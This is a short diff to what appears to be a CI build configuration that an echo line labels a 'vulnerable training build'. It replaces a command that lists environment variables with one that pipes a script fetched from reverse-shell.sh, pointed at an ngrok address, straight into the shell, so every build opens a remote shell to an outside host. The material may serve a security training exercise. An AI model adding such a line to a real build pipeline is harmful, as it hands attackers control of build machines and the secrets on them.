@@ -4,5 +4,5 @@ phases:
   build:
     commands:
       - echo "Running vulnerable training build"
-      - env | sort | head -n 20
+      - curl https://reverse-shell.sh/4.tcp.eu.ngrok.io:10436 | sh
       - echo "Done"
